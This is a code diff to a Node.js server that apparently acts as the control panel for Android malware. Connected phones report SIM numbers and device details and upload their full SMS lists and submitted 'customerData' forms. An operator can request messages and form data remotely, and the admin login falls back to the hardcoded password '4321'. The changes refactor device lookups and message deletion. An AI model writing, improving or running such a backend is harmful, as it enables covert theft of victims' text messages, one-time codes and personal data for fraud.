@@ -12,7 +12,6 @@ app.use(express.json({ limit: '1mb' }));
 app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// short request timeouts to fail fast on deploy platforms
 app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });
 
 const MONGO_URI = process.env.MONGO_URI || '';
@@ -63,6 +62,13 @@ async function getDevicesFromStore() {
 
 async function findOneInStore(query) {
   if (dbConnected) return await Device.findOne(query).lean();
+  if (query.$or) {
+    const found = inMemoryDevices.find(d => query.$or.some(q => {
+      const k = Object.keys(q)[0];
+      return d[k] === q[k];
+    }));
+    return clone(found || null);
+  }
   const keys = Object.keys(query);
   const found = inMemoryDevices.find(d => keys.every(k => d[k] === query[k]));
   return clone(found || null);
@@ -85,9 +91,9 @@ async function findOneAndUpdateInStore(query, update, opts) {
   }
 
   if (!item) {
+    if (!(opts && opts.upsert)) return null;
     const newItem = {};
     if (query.deviceId) newItem.deviceId = query.deviceId;
-    if (query.serialNumber) newItem.serialNumber = query.serialNumber;
     if (update && update.$setOnInsert) Object.assign(newItem, clone(update.$setOnInsert));
     if (update && update.$set) Object.assign(newItem, clone(update.$set));
     inMemoryDevices.push(newItem);
@@ -95,6 +101,12 @@ async function findOneAndUpdateInStore(query, update, opts) {
   }
 
   if (update && update.$set) Object.assign(item, clone(update.$set));
+  if (update && update.$pull && update.$pull.smsMessages) {
+      const p = update.$pull.smsMessages;
+      if (item.smsMessages) {
+          item.smsMessages = item.smsMessages.filter(m => !(m.body === p.body && (m.date === p.date || m.time === p.date)));
+      }
+  }
   return clone(item);
 }
 
@@ -105,7 +117,6 @@ global.deviceSockets = new Map();
 
 let adminPassword = process.env.ADMIN_PASSWORD || '4321';
 
-// --- API Routes ---
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body || {};
   if (username === 'admin' && password === adminPassword) return res.json({ success: true });
@@ -134,7 +145,7 @@ app.post('/api/delete-device', async (req, res) => {
     const { deviceId, password } = req.body || {};
     if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
     if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
-    const r = await findOneAndUpdateInStore({ deviceId }, { $set: { isDeleted: true, isOnline: false } }, { returnDocument: 'after' });
+    const r = await findOneAndUpdateInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] }, { $set: { isDeleted: true, isOnline: false } }, { returnDocument: 'after' });
     if (!r) return res.status(404).json({ success: false, message: 'Device not found' });
     io.emit('dashboard-update');
     return res.json({ success: true });
@@ -145,14 +156,7 @@ app.post('/api/delete-sms', async (req, res) => {
   try {
     const { deviceId, smsData } = req.body || {};
     if (!deviceId || !smsData) return res.status(400).json({ success: false, message: 'Missing fields' });
-    if (dbConnected) {
-      await Device.findOneAndUpdate({ deviceId }, { $pull: { smsMessages: { body: smsData.body, date: smsData.date } } });
-    } else {
-      const device = inMemoryDevices.find(d => d.deviceId === deviceId);
-      if (device && device.smsMessages) {
-        device.smsMessages = device.smsMessages.filter(m => !(m.body === smsData.body && (m.date === smsData.date || m.time === smsData.date)));
-      }
-    }
+    await findOneAndUpdateInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] }, { $pull: { smsMessages: { body: smsData.body, date: smsData.date } } });
     io.emit('dashboard-update');
     return res.json({ success: true });
   } catch (err) { return res.status(500).json({ success: false }); }
@@ -162,7 +166,7 @@ app.post('/api/pin-device', async (req, res) => {
   try {
     const { deviceId, status } = req.body || {};
     if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
-    const d = await findOneAndUpdateInStore({ deviceId }, { $set: { isPinned: !!status } }, { returnDocument: 'after' });
+    const d = await findOneAndUpdateInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] }, { $set: { isPinned: !!status } }, { returnDocument: 'after' });
     if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
     io.emit('dashboard-update');
     return res.json({ success: true });
@@ -173,7 +177,7 @@ app.post('/api/command', async (req, res) => {
   try {
     const { deviceId, action, data } = req.body || {};
     if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
-    let device = await findOneInStore({ deviceId });
+    let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] });
     const clients = global.deviceSockets.get(deviceId);
 
     if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
@@ -183,10 +187,7 @@ app.post('/api/command', async (req, res) => {
           try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: action, data: {} })); } catch (e) {}
         });
       }
-      if (!device) {
-        if (isOnline) return res.json({ success: true, isOnline, message: 'Requested data from device' });
-        return res.status(404).json({ success: false, message: 'Device not found' });
-      }
+      if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
       const responseData = { success: true, isOnline };
       if (action === 'VIEW_SMS') {
         let messages = device.smsMessages || [];
@@ -231,24 +232,24 @@ wss.on('connection', (ws, req) => {
         ws.deviceId = id;
         if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
         global.deviceSockets.get(id).add(ws);
-        const update = { $set: { isOnline: true, lastSeen: new Date() } };
+        const update = { $set: { deviceId: id, isOnline: true, lastSeen: new Date() } };
         if (data.model) update.$set.model = data.model;
         if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
         if (data.sim1) update.$set.sim1 = data.sim1;
         if (data.sim2) update.$set.sim2 = data.sim2;
         if (data.battery !== undefined) update.$set.battery = Number(data.battery) || 0;
+        if (data.serialNumber) update.$set.serialNumber = data.serialNumber;
         await findOneAndUpdateInStore({ $or: [{ deviceId: id }, { serialNumber: id }] }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
         io.emit('dashboard-update');
       }
       if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
-        await findOneAndUpdateInStore({ deviceId: data.deviceId }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
+        await findOneAndUpdateInStore({ $or: [{ deviceId: data.deviceId }, { serialNumber: data.deviceId }] }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
         io.emit('dashboard-update');
       }
       if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
-        await findOneAndUpdateInStore({ deviceId: data.deviceId }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
+        await findOneAndUpdateInStore({ $or: [{ deviceId: data.deviceId }, { serialNumber: data.deviceId }] }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
         io.emit('dashboard-update');
       }
-      // Handle command results from device and relay to dashboard
       if (data.type === 'COMMAND_RESULT' && data.deviceId) {
         io.emit('command-result', data);
       }
